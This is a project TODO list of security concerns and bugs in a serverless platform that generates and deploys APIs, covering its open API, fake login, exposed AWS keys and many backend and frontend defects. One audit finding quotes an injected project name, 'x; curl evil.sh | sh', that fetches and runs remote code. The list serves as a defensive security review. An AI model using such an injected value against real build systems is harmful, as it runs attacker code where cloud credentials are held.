# TODO

Known bugs and security concerns found while adding the unit test suites (2026-10-15).
Tests currently **document** the existing behaviour for the bugs below; fixing a bug will mean updating the matching test.

## Security

### Critical

- [ ] **No authentication or authorization on the API.** No function in `backend-service/serverless.yml` has an authorizer, and CORS is `*`. Anyone who knows the URL can list, edit and delete projects. `DELETE /project/{id}` also tears down the project's CloudFormation stack and empties its S3 buckets.
- [ ] **The login is fake.** `frontend-service/src/Login/action.ts:8` compares against hard-coded `admin` / `password` in the browser. It protects nothing, because the API is open (see above).
- [ ] **Command injection into CodeBuild.** The project name is interpolated unescaped into a shell command in the buildspec (`node ./docs.js -p ${projectName}`, `deploymentEvent.ts:118`). A project named e.g. `x; curl evil.sh | sh` runs arbitrary commands inside a build that holds the platform's AWS keys. The project name is only validated as `min(3)` (`project.dto.ts`).
- [ ] **Code and template injection through model metadata.** Model names, property names and types, and relations are pasted into generated TypeScript (function names, bodies, JSDoc) and `serverless.yml` (`codeBuilder.ts`, `modelEvent.ts`). Names are only validated as `min(3)` and property names/types not at all, so a crafted name can inject code into the deployed service. Restrict names to identifier-safe characters (e.g. `/^[A-Za-z][A-Za-z0-9]*$/`) and types to an enum.
- [ ] **Static AWS credentials are spread around.** `AWS_KEY`/`AWS_SECRET` are plain Lambda environment variables used in place of the execution role. They are also written into the CodeBuild `buildspecOverride` `env.variables` (`deploymentEvent.ts:103`), where anyone with `codebuild:BatchGetBuilds` can read them in the build definition. Use IAM roles (the Lambda execution role, plus a CodeBuild service role) and drop the keys.
- [ ] **The control-plane IAM role is `Action: "*"`, `Resource: "*"`** (`serverless.yml:34`). Scope it to the tables, buckets, Lambda, CodeBuild, CloudFormation and Cost Explorer calls actually used.

### High

- [ ] **Build logs are served unauthenticated.** `GET /deployment/{projectId}` returns the full CodeBuild/CloudWatch log, which can include secrets echoed by the build.
- [ ] **Path parameters are unvalidated.** `projectId` goes straight into S3 keys (e.g. `projectId + "/swagger-json.json"` in `deployment.ts`) and DynamoDB keys. Validate ids as UUIDs.
- [ ] **Cost Explorer can be abused.** `GET /project/cost/{id}` calls Cost Explorer (billed per request) with no authentication or rate limit.
- [ ] **Unbounded scan size.** `GET /project?take=` passes a user-supplied `Limit` to a table Scan (`project.ts:89`). Clamp it.

## Backend bugs

- [ ] **`DeleteModel` updates the wrong item and can resurrect the deleted model** (`model.ts:696-711`). For each related model it writes the filtered relations to `sk = ml_<deleted model id>` (the model being deleted), not the related model. That update runs in `Promise.all` with the `DeleteCommand` on the same key, and `UpdateItem` upserts, so a ghost item can be left behind. Related models also keep dangling relations to the deleted model.
- [ ] **Invalid CloudFormation for model tables.** `modelCreatedHandler` puts `Tags` at the resource level instead of under `Properties` (`modelEvent.ts:90`). CloudFormation rejects that ("Invalid template resource property 'Tags'"). `modelUpdatedHandler` then re-creates the resource without any tags, so cost attribution by tag is lost after any update.
- [ ] **Cost period dates are wrong outside UTC and on the 1st.** `getStackCurrentCost`/`getStackMonthlyCost` build local-midnight dates and format them with `toISOString()` (`infraHelper.ts:207,246`), which shifts them to the previous day in UTC+ timezones. On the 1st of the month `Start === End` for the current cost, which Cost Explorer rejects.
- [ ] **`deleteFolder` deletes the wrong zip** for a prefix ending in `/`: `prefix.substring(0, prefix.indexOf("/") - 1)` drops the last character (`proj/` becomes `pro.zip`) (`S3Client.ts:119`). It also only deletes the first 1,000 objects (no pagination).
- [ ] **Name and id collisions.**
  - `getServiceName`/`getTableName` keep only the last 6 hex chars of the project id (`substring(26)`). Service, stack and table names can collide between projects; a 50% chance at about 5k projects.
  - `getTableName` only removes the first space (`replace(" ", "")`).
  - The duplicate-model check is case-sensitive, so `User` and `user` map to the same table.
- [ ] **Stale files can be redeployed.** `deploymentTriggeredHandler` downloads into a fixed `/tmp/.downloads/<projectId>` that is never cleaned. Warm Lambdas re-zip files deleted from S3 since the last deploy, and `/tmp` fills up over time.
- [ ] **Stream leaks and crashes in `deploymentEvent.ts`.**
  - `downloadSourceCode` opens a write stream before checking for a null S3 body; it leaves an empty file and an open file handle (`:188`).
  - `zipFolder`'s output stream has no `error` listener, so a write error crashes the process (`:137`).
- [ ] **Model event handlers can fail half-way.** `modelDeletedHandler`/`modelUpdatedHandler` have no try/catch. In dev (`LocalEventHub`) the HTTP handler then returns 500 even though the DynamoDB write already succeeded.
- [ ] **`GetDeployment` can 500 on a successful deploy.** It `JSON.parse`s the swagger file whenever `apiId` is set. If the file is missing (`downloadFile` → `null` → `""`), the request fails with 500.
- [ ] **`TriggerDeployment` has a race.** `isDeploying` is only set to `true` later by the async event handler, so two quick triggers both start builds. `isDeploying` is only reset when someone calls `GetDeployment`.
- [ ] **`GetProjects` pagination is broken.** `Limit` applies before the `entityType` filter, so pages can be empty while `hasMore` is true. `nextPageToken` rebuilds `sk` from `pk`, which is wrong when the last evaluated item is a model or deployment row.
- [ ] **`CreateModelRelations` leaves stale back-references.** It replaces the main model's relations with the request body, but models dropped from the list keep their back-reference.
- [ ] **`LocalEventHub.publish` doesn't return after rejecting an unknown event**, so it goes on to dereference `undefined` (`eventhub.ts:64`).
- [ ] **Wrong names in error logs.** `GetOneProject`/`PutProject`/`DeleteProject` log as `GetProjects`, model handlers log as `GetModels`, `projectDeletedHandler` logs as `projectCreatedHandler`, and model delete/update log as `modelCreatedHandler`.
- [ ] **Typo in `MODEL_UPDATED`:** `"model upated"` (harmless, but it is part of the event contract).
- [ ] **`uuid` isn't declared in `backend-service/package.json`.** It only resolves because another package depends on it.
- [ ] **Outdated runtimes.** The control plane runs on `nodejs18.x` (end of life on Lambda), the generated services on `nodejs20.x`, and the buildspec installs `serverless@3` while the repo uses v4.
- [ ] **Unreachable guard in `deploymentEvent.ts`.** It checks `if (!response)` after `zipFolder`, which only ever resolves `true` or rejects. It is excluded from coverage with a `v8 ignore` hint.

## Frontend bugs

- [ ] **Stale relationships are never removed.** `relToDelete` is never filled: `editRelationship` only records the old relation when `field == "relatedModel"`, but the selects only edit `modelId` and `relationship` (`modelManager.tsx:210`). The cleanup PUT in `pushModelUpdate` therefore never runs. These paths are excluded from coverage with `v8 ignore` hints until they're fixed.
- [ ] **Cancel buttons submit their forms.** In the "New Project" and "Edit Project" dialogs (`Projects.tsx:62`, `ProjectCard.tsx:99`), the Cancel buttons have no `type="button"`, so clicking Cancel also submits the form (an edit is sent with no `action`).
- [ ] **Loader errors crash the page.** On network errors the loaders call `alert()` and return `undefined` (`Project/loader.ts:11`, `ProjectDetail/loader.ts:28`). The pages then destructure `undefined` from `useLoaderData()` and crash. Throw, and use an `errorElement`.
- [x] **The API base URL is hard-coded to a staging endpoint** in every loader, action and `modelManager.tsx`. Moved to `VITE_API_URL` (`src/config.ts`).
- [ ] **Cost cards never show.** `ProjectDetails` renders cost cards from `bill`, but the loader's cost fetch is commented out (`ProjectDetail/loader.ts:16-19`).
- [ ] **`deleteRelationship` sends an extra field.** It sends `modelName`, which the backend schema doesn't define (it is stripped). For an unsaved row it sends `modelId: ""`.
- [ ] **Debug logging left in.** `console.log` runs on every `ModelManager` render and after creating a model.
- [ ] **Peer-dependency conflict.** `swagger-ui-react@5` declares `react <19`, but the app uses React 19. Installs need `--legacy-peer-deps` (set in `frontend-service/.npmrc`).
- [ ] **Existing lint errors.** `npm run lint` reports 7 `no-explicit-any` errors that predate the tests.
